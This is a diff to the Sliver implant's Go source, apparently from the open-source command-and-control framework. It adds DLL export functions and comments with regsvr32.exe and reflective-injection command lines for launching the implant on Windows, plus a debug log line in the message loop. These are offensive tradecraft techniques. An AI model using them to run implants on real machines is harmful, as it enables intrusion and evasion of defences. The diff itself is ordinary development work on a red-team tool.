@@ -19,7 +19,6 @@ package main
 */
 
 // {{if .IsSharedLib}}
-
 import "C"
 
 // {{end}}
@@ -48,11 +47,38 @@ import (
 
 // {{if .IsSharedLib}}
 
+var isRunning bool = false
+
 // RunSliver - Export for shared lib build
 //export RunSliver
 func RunSliver() {
-	main()
+	if !isRunning {
+		isRunning = true
+		main()
+	}
 }
+
+// Thanks Ne0nd0g for those
+//https://github.com/Ne0nd0g/merlin/blob/master/cmd/merlinagentdll/main.go#L65
+
+// VoidFunc is an exported function used with PowerSploit's Invoke-ReflectivePEInjection.ps1
+//export VoidFunc
+func VoidFunc() { main() }
+
+// DllInstall is used when executing the Sliver implant with regsvr32.exe (i.e. regsvr32.exe /s /n /i sliver.dll)
+// https://msdn.microsoft.com/en-us/library/windows/desktop/bb759846(v=vs.85).aspx
+//export DllInstall
+func DllInstall() { main() }
+
+// DLLRegisterServer is used when executing the Sliver implant with regsvr32.exe (i.e. regsvr32.exe /s sliver.dll)
+// https://msdn.microsoft.com/en-us/library/windows/desktop/ms682162(v=vs.85).aspx
+//export DllRegisterServer
+func DllRegisterServer() { main() }
+
+// DLLUnregisterServer is used when executing the Sliver implant with regsvr32.exe (i.e. regsvr32.exe /s /u sliver.dll)
+// https://msdn.microsoft.com/en-us/library/windows/desktop/ms691457(v=vs.85).aspx
+//export DllUnregisterServer
+func DllUnregisterServer() { main() }
 
 // {{end}}
 
@@ -94,6 +120,9 @@ func mainLoop(connection *transports.Connection) {
 
 	for envelope := range connection.Recv {
 		if handler, ok := specialHandlers[envelope.Type]; ok {
+			// {{if .Debug}}
+			log.Printf("[recv] specialHandler %d", envelope.Type)
+			// {{end}}
 			handler(envelope.Data, connection)
 		} else if handler, ok := sysHandlers[envelope.Type]; ok {
 			// {{if .Debug}}
